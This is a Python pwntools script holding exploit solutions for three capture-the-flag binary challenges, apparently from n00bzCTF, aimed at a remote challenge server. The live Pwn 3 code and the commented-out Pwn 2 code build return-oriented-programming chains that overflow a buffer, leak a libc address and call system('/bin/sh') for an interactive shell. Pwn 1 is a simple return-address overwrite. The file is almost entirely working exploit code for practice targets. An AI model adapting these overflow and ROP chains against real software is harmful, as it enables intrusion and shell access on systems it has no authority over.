#Pwn 3
from pwn import *
elf = context.binary = ELF("./pwn3")
libc = elf.libc
r = process()
r = remote("challs.n00bzunit3d.xyz", 42450)
# gdb.attach(r, 
# '''
#     b*main+78\n
#     c
# ''')
pop_rdi = 0x0000000000401232
ret = pop_rdi+1
addr_binsh = 0x4047c0
mov_rbp_rsp = 0x000000000040122f

payload = flat(
    cyclic(40),
    mov_rbp_rsp,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols["main"]+4
)
r.sendline(payload)

r.recvuntil(b"{f4k3_fl4g}\n")
puts_leak = u64(r.recv(6) + b'\x00\x00')
libc.address = (puts_leak - libc.sym["puts"])
log.success(f"Libc base: {hex(libc.address)}")

payload = flat(
    cyclic(40),
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.symbols["system"]
)
r.sendline(payload)
r.interactive()


# PWN 2
# from pwn import *
# elf = context.binary = ELF("./pwn2")
# libc = elf.libc
# # r = process()
# r = remote("challs.n00bzunit3d.xyz", 61223)
# pop_rdi = 0x0000000000401196
# ret = pop_rdi + 1

# r.sendline(b"A")
# payload = b"A" * 40 + flat(ret,pop_rdi,elf.got['puts'],elf.plt['puts'],elf.symbols["main"]+5)
# r.sendline(payload)

# r.recvuntil(b"{f4k3_fl4g}")
# puts_leak = u64(r.recv(6) + b'\x00\x00')
# libc.address = (puts_leak - libc.sym["puts"])
# log.success(f"Libc base: {hex(libc.address)}")

# r.sendlineafter(b"like a flag?", b"A")
# payload = b"A" * 40 + p64(ret) + flat(pop_rdi,next(libc.search(b"/bin/sh")),elf.symbols["system"])
# r.sendline(payload)
# r.interactive()

# PWN 1
# from pwn import *
# elf = context.binary = ELF("./pwn1")
# r = elf.process()
# r = remote("challs.n00bzunit3d.xyz", 35932)

# payload = b"a" * 72 + p64(0x000000000040124a)
# r.send(payload)
# r.interactive()